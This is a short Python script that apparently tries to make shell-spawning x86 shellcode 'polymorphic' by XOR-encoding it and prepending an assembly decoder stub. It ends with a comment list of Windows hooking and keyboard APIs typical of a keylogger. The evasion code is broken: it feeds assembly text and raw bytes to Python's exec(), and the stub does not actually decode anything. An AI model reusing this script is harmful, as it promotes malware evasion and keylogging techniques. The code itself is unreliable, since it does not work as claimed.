import random

# Original shellcode
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Function to perform XOR encoding
def xor_encode(data, key):
    encoded_data = bytearray()
    for byte in data:
        encoded_byte = byte ^ key
        encoded_data.append(encoded_byte)
    return encoded_data

# Generate a random key
key = random.randint(1, 255)

# Encode the shellcode
encoded_shellcode = xor_encode(shellcode, key)

# Generate the decoder stub
decoder_stub = f"""
xor eax, eax
mov al, {key}
xor ecx, ecx
mov cl, {len(encoded_shellcode)}
lea edi, [esi+ecx+2]
std
repne scasb
not ecx
dec edi
dec edi
jmp edi
"""

# Final polymorphic shellcode
polymorphic_shellcode = bytes(decoder_stub.encode()) + encoded_shellcode

# Execute the polymorphic shellcode
exec(polymorphic_shellcode)



###################################################
# CallNextHookEx
# FindWindowA
# GetForegroundWindow
# GetKeyState
# GetKeyboardLayout
# GetMessageW
# GetWindowTextA
# GetWindowThreadProcessId
# MapVirtualKeyExA
# MessageBoxW
# SetWindowsHookExW
# ShowWindow
# UnhookWindowsHookEx